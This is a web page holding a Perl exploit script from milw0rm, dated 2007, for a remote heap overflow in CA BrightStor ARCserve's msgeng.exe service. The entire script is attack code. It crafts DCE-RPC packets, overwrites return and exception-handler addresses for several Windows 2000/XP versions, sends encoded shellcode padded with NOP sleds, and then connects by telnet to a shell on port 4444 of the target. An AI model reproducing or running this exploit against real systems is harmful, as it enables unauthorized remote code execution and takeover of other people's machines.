<html><head><title>CA BrightStor ARCserve (msgeng.exe) Remote Heap Overflow Exploit 2</title></head><pre>#!/usr/bin/perl
# 
# original exploit by lssec.com this is a perl porting
# 
# acaro [at] jervus.it


use IO::Socket::INET;
use Switch;

if (@ARGV &lt; 3) {
print &quot;--------------------------------------------------------------------\n&quot;;
print &quot;Usage : BrightStoreARCServer-11-5-4targets.pl -hTargetIPAddress -oTargetReturnAddress\n&quot;;
print &quot; Return address: \n&quot;;
print &quot; 1 - Windows 2k Sp4 English Version\n&quot;;
print &quot; 2 - Windows 2k Sp4 Italian Version\n&quot;;
print &quot; 3 - Windows XP Pro Sp1 English Version\n&quot;;
print &quot; 4 - Windows XP Pro Sp0 English Version\n&quot;;
print &quot; If values not specified, Windows 2k Sp4 will be used.\n&quot;;
print &quot; Example : ./BrightStoreARCServer-11-5-4targets.pl -h127.0.0.1 -o1 -o1\n&quot;;
print &quot;--------------------------------------------------------------------\n&quot;;
}

use IO::Socket::INET;

my $host = 10.0.0.2;
my $port = 6503;
my $reply;
my $request;
my $jmp=&quot;\xeb\x0a\x90\x90&quot;;	# JMP over ret and uef to our shellcode




foreach (@ARGV) {
$host = $1 if ($_=~/-h((.*)\.(.*)\.(.*)\.(.*))/);
$uef = $1 if ($_=~/-o(.*)/);
$ret = $1 if ($_=~/-o(.*)/);
}




switch ($uef) {
case 1 { $uef=&quot;\x4c\x14\x54\x7c&quot; } # Win2k SP4 English version
case 2 { $uef=&quot;\x4c\x14\x68\x79&quot; } # Win2k SP4 Italian  version
case 3 { $uef=&quot;\xb4\x73\xed\x77&quot; } # WinXP Pro English SP1 version
case 4 { $uef=&quot;\xb4\x63\xed\x77&quot; } # WinXP Pro English SP0 version
}

switch ($ret) {
case 1 { $ret=&quot;\xbf\x75\x40\x2d&quot; } # Win2k SP4 English version CALL DWORD PTR DS:[ESI+48] in qclient.dll
case 2 { $ret=&quot;\xbf\x75\x40\x2d&quot; } # Win2k SP4 Italian  version CALL DWORD PTR DS:[ESI+48] in qclient.dll
case 3 { $ret=&quot;\x52\xbf\x04\x78&quot; } # WinXP Pro English SP1 version CALL DWORD PTR DS:[EDI+6c] in RPCRT4.dll
case 4 { $ret=&quot;\xd7\xe9\xd0\x77&quot; } # WinXP Pro English SP0 version CALL DWORD PTR DS:[EDI+6c] in RPCRT4.dll
}




my $shellcode  =
&quot;\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0&quot;.
&quot;\x00\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;.
&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf&quot;.
&quot;\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbA\xbb\xbc\xbd\xbe\xbf&quot;.
&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf&quot;.
&quot;\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;.
&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef&quot;.
&quot;\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;.
&quot;\x1f\xb9\x85\x79\x86\x07\xd0\x18\x88\x18\x90\x18\xbf\x3b\x1c\xfa&quot;.
&quot;\x88\xa4\x0e\xd6\xdb\x3f\x1c\xfc\xbf\xe6\x06\x4c\x61\x82\xeb\x28&quot;.
&quot;\xb5\x05\xe1\xd5\x30\x07\x3a\x23\x15\xc2\xb4\xd5\x36\x3c\xb0\x79&quot;.
&quot;\xb3\x3c\xa0\x79\xa3\x3c\x1c\xfa\x86\x07\xf2\x76\x86\x3c\x6a\xcb&quot;.
&quot;\x75\x07\x47\x30\x90\xa8\xb4\xd5\x36\x05\xf3\x7b\xb5\x90\x33\x42&quot;.
&quot;\x44\xc2\xcd\xc3\xb7\x90\x35\x79\xb5\x90\x33\x42\x05\x26\x65\x63&quot;.
&quot;\xb7\x90\x35\x7a\xb4\x3b\xb6\xd5\x30\xfc\x8b\xcd\x99\xa9\x9a\x7d&quot;.
&quot;\x1f\xb9\xb6\xd5\x30\x09\x89\x4e\x86\x07\x80\x47\x69\x8a\x89\x7a&quot;.
&quot;\xb9\x46\x2f\xa3\x07\x05\xa7\xa3\x02\x5e\x23\xd9\x4a\x91\xa1\x07&quot;.
&quot;\x1e\x2d\xcf\xb9\x6d\x15\xdb\x81\x4b\xc4\x8b\x58\x1e\xdc\xf5\xd5&quot;.
&quot;\x95\x2b\x1c\xfc\xbb\x38\xb1\x7b\xb1\x3e\x89\x2b\xb1\x3e\xb6\x7b&quot;.
&quot;\x1f\xbf\x8b\x87\x39\x6a\x2d\x79\x1f\xb9\x89\xd5\x1f\x58\x1c\xfa&quot;.
&quot;\x6b\x38\x1f\xa9\x24\x0b\x1c\xfc\xb2\x90\x33\x42\x10\xe5\xe7\x75&quot;.
&quot;\xb3\x90\x35\xd5\x30\x6f\xe3\x2a&quot;;


my $uuid=&quot;\x05&quot;.							#version
&quot;\x00&quot;.									#version minor
&quot;\x0b&quot;.									#packet bind
&quot;\x03&quot;.									#packet flag
&quot;\x10\x00\x00\x00&quot;.							#data rapresentation
&quot;\x48\x00&quot;.								#fragment length
&quot;\x00\x00&quot;.								#auth length
&quot;\x01\x00\x00\x00&quot;.							#call id
&quot;\xd0\x16\xd0\x16&quot;.				
&quot;\x00\x00\x00\x00&quot;.							#assoc group			
&quot;\x01\x00\x00\x00\x00\x00\x01\x00&quot;.					
&quot;\xf0\x6b\x24\xdc\x7a\x7a\xce\x11\x9f\x88\x00\x80\x5f\xe4\x38\x38&quot;.	#uuid
&quot;\x01\x00&quot;.								#interface ver
&quot;\x00\x00&quot;.								#interface ver minor
&quot;\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60&quot;.	#transfer syntax
&quot;\x02\x00\x00\x00&quot;;							#syntax ver

my $special=&quot;\x05&quot;.							#version
&quot;\x00&quot;.									#version minor
&quot;\x00&quot;.									#packet type request
&quot;\x03&quot;.									#packet flags
&quot;\x10\x00\x00\x00&quot;.							#data rapresentation
&quot;\x18\x08&quot;.								#frag length
&quot;\x00\x00&quot;.								#auth length
&quot;\x01\x00\x00\x00&quot;.							#call id
&quot;\x00\x08\x00\x00&quot;.							#alloc hint
&quot;\x00\x00&quot;.								#contex id
&quot;\x2b\x00&quot;;								#opnum 43




my $socket = IO::Socket::INET-&gt;new(proto=&gt;'tcp', PeerAddr=&gt;$host, PeerPort=&gt;$port);
$socket or die &quot;Cannot connect to host!\n&quot;;


$request = $uuid;
send $socket, $request, 0;
print &quot;[+] Sent uuid request\n&quot;;
recv($socket, $reply, 1024, 0);


$request = $special.(&quot;\x90&quot;x680).$jmp.$ret.$uef.$shellcode.(&quot;\x90&quot;x1006).&quot;\r\n&quot;;
send $socket, $request, 0;
print &quot;[+] Sent malicius 1st request\n&quot;;


$request = $special.(&quot;\x90&quot;x680).$jmp.$ret.$uef.$shellcode.(&quot;\x90&quot;x1029).&quot;\r\n&quot;;
send $socket, $request, 0;
print &quot;[+] Sent malicius 2nd request\n&quot;;



print &quot; + Connect on 4444 port of $host ...\n&quot;;
sleep(3);
system(&quot;telnet $host 4444&quot;);
exit;

# milw0rm.com [2007-01-28]</pre></html>